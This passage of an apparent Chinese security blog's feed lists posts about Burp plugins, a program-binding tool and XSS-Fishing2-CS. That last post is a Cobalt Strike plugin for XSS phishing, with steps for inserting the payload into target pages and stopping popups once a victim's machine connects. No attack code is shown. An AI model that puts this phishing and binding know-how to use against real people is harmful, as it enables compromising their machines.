<figure data-type="image" tabindex="12"><img src="https://blog.thekingofduck.com/post-images/1612093839683.jpg" alt="" loading="lazy"></figure>
<p>搜索了一下应该是Linksys路由的命令注入.</p>
<figure data-type="image" tabindex="13"><img src="https://blog.thekingofduck.com/post-images/1612093860509.png" alt="" loading="lazy"></figure>
<p>看起来是未授权相关的漏洞,80端口配置了很低从其他蜜罐上扒下来的Server头,可能是其中一款产品的洞吧,涉及的产品太多,百度没搜到这个路由,无法验证了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[captcha-killer修改随笔]]></title>
        <id>https://blog.thekingofduck.com/post/recode-captcha-killer/</id>
        <link href="https://blog.thekingofduck.com/post/recode-captcha-killer/">
        </link>
        <updated>2020-08-08T09:50:14.000Z</updated>
        <content type="html"><![CDATA[<p>成品如下:</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1596880625428.png" alt="" loading="lazy"></figure>
<p>新增功能特性:<br>
1.当验证码结果返回值非图标时，使用自定义正则匹配验证码位置。<br>
2.当识别出匹配结果为图标时自动锁定正则输入框以及匹配按钮。<br>
3.针对团队购买的识别接口返回值预设正则, etc...</p>
<p>适应新场景：<br>
requests:</p>
<pre><code>GET /xxxx.ashx?op=getVerifyCodeImage HTTP/1.1
Host: www.baidu.com
</code></pre>
<p>response:</p>
<pre><code>{&quot;success&quot;:true,&quot;image&quot;:&quot;图标的base64值&quot;}
</code></pre>
<p>输入正则:</p>
<pre><code>&quot;success&quot;:true,&quot;image&quot;:&quot;(.*?)&quot;
</code></pre>
<p>即可正常识别。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Copy2Yaml:一键生成yaml poc]]></title>
        <id>https://blog.thekingofduck.com/post/copy2yaml/</id>
        <link href="https://blog.thekingofduck.com/post/copy2yaml/">
        </link>
        <updated>2020-06-27T16:38:24.000Z</updated>
        <content type="html"><![CDATA[<p>初次使用JavaFX，不得不说体验比swing强太多了。</p>
<p>开发过程忘记了burp是swing画的GUI，调试卡了好久，难受啊。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1593276055852.jpg" alt="" loading="lazy"></figure>
<p>对标xray的poc来开发的，虽然兼容但是不是写给xray用的。</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1593276097179.jpg" alt="" loading="lazy"></figure>
<p>写了支持终端模式，burp插件模式，在或者直接打开复制粘贴数据包也是可以的，又是写bug的一天。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MatryoshkaDollTool-一款程序捆绑工具]]></title>
        <id>https://blog.thekingofduck.com/post/MatryoshkaDollTool/</id>
        <link href="https://blog.thekingofduck.com/post/MatryoshkaDollTool/">
        </link>
        <updated>2020-05-23T15:33:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="what">WHAT</h3>
<p>一款程序捆绑工具，取名MatryoshkaDollTool，也叫俄罗斯套娃工具。</p>
<p>开源这个只有基础捆绑功能的版本，给套娃程序添加自启以及加密功能的版本哪天高兴了就开源。</p>
<h3 id="why">WHY</h3>
<p>找不到好用的没后门的捆绑工具所以自己动手写了。</p>
<h3 id="how">HOW</h3>
<figure data-type="image" tabindex="1"><img src="https://github.com/TheKingOfDuck/MatryoshkaDollTool/blob/master/img/screenshot.png" alt="" loading="lazy"></figure>
<h3 id="where">WHERE</h3>
<p>成品在bin目录下。</p>
<h3 id="todo-list">TODO List</h3>
<ul>
<li>把目前的壳变成真壳。</li>
<li>开放添加套娃的自启，加密。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSS-Fishing2-CS：钓鱼自动收杆指南]]></title>
        <id>https://blog.thekingofduck.com/post/XSS-Fishing2-CS/</id>
        <link href="https://blog.thekingofduck.com/post/XSS-Fishing2-CS/">
        </link>
        <updated>2020-04-19T14:23:30.000Z</updated>
        <content type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~</p>
<p>项目地址：<a href="https://github.com/TheKingOfDuck/XSS-Fishing2-CS">XSS-Fishing2-CS</a></p>
<p>使用场景：使用xss弹窗提示钓鱼的时候会面临这样一个问题，如果鱼儿已经上线了，页面那边还在不停的弹窗，很容易引起鱼儿怀疑，权限说没就没了。</p>
<h3 id="开发">开发</h3>
<p>cs插件:<br>
<img src="https://blog.thekingofduck.com/post-images/fishing2.png" alt="" loading="lazy"></p>
<p>没啥难度，都是照着官方函数库复制...魔性的是我的ubantu死活跑不起来，centos可以...</p>
<p>php端：<br>
<img src="https://blog.thekingofduck.com/post-images/fishing1.png" alt="" loading="lazy"><br>
都是基本 语法，基本逻辑，但是遇到一个有趣的弱类型问题：</p>
<pre><code>fwrite(&quot;ips.txt&quot;, &quot;127.0.0.1&quot;);
</code></pre>
<p>写入的结果是127，之后的内容会被当做小点数被忽略掉，所以图中代码那个base64并非我闲着没事做...</p>
<h3 id="使用">使用</h3>
<p>1.将xss.php放到自己的服务器上去并修改第三行的钓鱼Payload。</p>
<p>2.修改xssFisher.cna第4行中的企业微信机器人的密钥，第23行中的xss.php的实际地址。</p>
<p>3.加载cs插件，将xss的Payload插入目标页面。</p>
<h3 id="特点">特点</h3>
<p>1.企业微信上线提示</p>
<p>2.机器上线后立即停止钓鱼的弹窗</p>
<p>3.只停止单个IP的弹窗，其他IP仍然可以继续弹窗，继续上线。</p>
<h3 id="todo">TODO</h3>
<p>1.特定网段上线的问题（？这个场景没有很清楚）<br>
2.内网ip也判断下，避免出现多个目标在一个小的局域网共用一个外网IP，其中一台上线后其他机器就不弹窗了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Copy2Java：在Burp中一键生成Java代码]]></title>
        <id>https://blog.thekingofduck.com/post/Copy2Java/</id>
        <link href="https://blog.thekingofduck.com/post/Copy2Java/">
        </link>
        <updated>2020-04-12T17:18:19.000Z</updated>
        <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/TheKingOfDuck/Copy2Java">https://github.com/TheKingOfDuck/Copy2Java</a></p>
<h3 id="0x01-初始化">0x01 初始化</h3>
<p>先说说为什么要用Java写这个插件？为什么要生成的是Java的代码。</p>
<p>1.简化安全从业者用Java写web漏洞利用工具的流程。</p>
<p>2.其他语言有插件实现了，生成现成的JAVA代码可在强迫自己使用Java的同时也不会拉低效率。</p>
<h3 id="0x02-加载中">0x02 加载中</h3>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413020409078.png" alt="image-20200413020409078" loading="lazy"></figure>
<p>代码写完回头再看除了感觉辣鸡没什么太多其他感觉，过程中最麻烦的是画GUI，intellj拖控件有点恶心，eclipse拖好后再复制回intellj即可。在http发包方面目前用过的最方便的是HttpRequest，所以生成的代码依赖也选择它，打包在了项目的lib目录，导入即可。</p>
<h3 id="0x02-加载成功">0x02 加载成功</h3>
<p>使用:</p>
<p>1.加载插件：</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413021026557.png" alt="image-20200413021026557" loading="lazy"></figure>
<p>2.在burp的repeater中点击Copy2Java菜单：</p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413021159116.png" alt="image-20200413021159116" loading="lazy"></figure>
<p>3.设置是否开启代理【可选】：</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413021244692.png" alt="image-20200413021244692" loading="lazy"></figure>
<p>默认是不开代理的，没需要的话这部可以跳过。</p>
<p>4.点击步骤3中弹出的窗口中的Copy to clipboard按钮复制代码并粘贴到ide:</p>
<p>添加插件lib目录下的依赖包</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413021640508.png" alt="image-20200413021640508" loading="lazy"></figure>
<p>完成</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413022210153.png" alt="image-20200413022210153" loading="lazy"></figure>
<p>如何高效的写一个web相关漏洞的利用工具？</p>
<p>1.新建mvn项目，并将生成的代码复制进来。</p>
<p>2.修改传入的参数，mvn package快速打包。</p>
<p>比用Python写慢？不存在的！</p>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/copy2java//image-20200413022944759.png" alt="image-20200413022944759" loading="lazy"></figure>
]]></content>
    </entry>
</feed>